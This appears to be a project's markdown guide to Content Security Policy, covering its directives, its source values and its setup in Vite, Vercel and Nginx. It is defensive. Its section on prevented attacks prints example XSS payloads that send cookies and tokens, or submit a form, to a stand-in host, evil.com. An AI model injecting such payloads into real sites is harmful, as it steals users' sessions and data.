# Content Security Policy (CSP)

## What is CSP?

CSP is an HTTP response header (`Content-Security-Policy`) that tells the browser which sources of content are allowed to load on your page. It acts as a **whitelist** — anything not explicitly permitted is blocked by the browser.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

## Why is it important?

CSP is a **defense-in-depth** mechanism against Cross-Site Scripting (XSS) and data injection attacks. Even if an attacker bypasses input sanitization, CSP can stop the exploit from executing by blocking unauthorized resources.

## Directives

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all resource types without their own directive |
| `script-src` | Scripts (JS, Web Workers) |
| `style-src` | Stylesheets and `style` attributes |
| `img-src` | Images and favicons |
| `connect-src` | XMLHttpRequest, fetch, WebSocket, EventSource |
| `font-src` | Web fonts |
| `frame-src` | iframes |
| `frame-ancestors` | Who can embed the page in an iframe (clickjacking protection) |
| `form-action` | Valid targets for form submissions |
| `report-uri` / `report-to` | Where to send violation reports |

## Source Values

| Value | Meaning |
|-------|---------|
| `'none'` | Block everything |
| `'self'` | Same origin only |
| `https://cdn.example.com` | Specific origin |
| `https:` | Any HTTPS origin |
| `'unsafe-inline'` | Allow inline `<script>` / `<style>` (weakens security) |
| `'unsafe-eval'` | Allow `eval()` / `setTimeout(string)` (weakens security) |
| `'strict-dynamic'` | Trust scripts loaded by already-trusted scripts |
| `nonce-<base64>` | Allow a specific inline script by nonce |
| `<hash>-<base64>` | Allow a specific inline script by hash |

## How Attacks Are Prevented

### Inline XSS
Attacker injects: `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`

With `script-src 'self'` (no `'unsafe-inline'`), the browser **refuses to execute** the injected script.

### Data Exfiltration via Beacon
Injected code: `new Image().src = 'https://evil.com/?data=' + token`

`img-src 'self'` or `connect-src 'self'` blocks the request to the external server.

### Form Hijacking
Injected: `<form action="https://evil.com/steal">`

`form-action 'self'` prevents submission to an external URL.

### Clickjacking
Attacker loads your site in an iframe on `evil.com`.

`frame-ancestors 'none'` prevents the browser from rendering the page in any iframe.

### CDN Compromise
A compromised CDN serves malicious JS. If you set `script-src 'self'` (not the CDN), the browser rejects it.

## Setup in This Project

### Local Development (`vite.config.ts`)

```ts
server: {
  headers: {
    'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws:; img-src 'self' data:; font-src 'self' data:"
  }
}
```

`'unsafe-inline'` and `'unsafe-eval'` are required in dev for Vite HMR and source maps — remove them in production if possible.

### Production (Vercel — `vercel.json`)

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' /api"
        }
      ]
    }
  ]
}
```

Adjust `connect-src` to include your API base URL and any other origins the MFE needs (e.g., Module Federation host origin).

### Nginx / Generic Server

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' /api";
```

## Testing Locally

```bash
curl -I http://localhost:3001 | grep -i content-security-policy
```

Or open DevTools → Network tab → click any request → check **Response Headers**.

Violations appear in the browser Console with messages like:
```
Refused to load the script '...' because it violates the following Content Security Policy directive: "script-src 'self'".
```

## Report-Only Mode

Test a policy without enforcing it:

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations
```

Violations are logged / reported but nothing is blocked. Useful when rolling out a new policy.

## Best Practices

1. **Start strict** — begin with `default-src 'none'`, then add only what you need
2. **Avoid `'unsafe-inline'`** in production — use `nonce-` or `<hash>` instead
3. **Avoid `'unsafe-eval'`** if your code doesn't need `eval()` or dynamic imports
4. **Use `report-uri`** to catch violations in production without breaking the app
5. **Test in report-only mode** before enforcing
6. **Pin specific CDN URLs** rather than broad origins like `https://cdn.*`
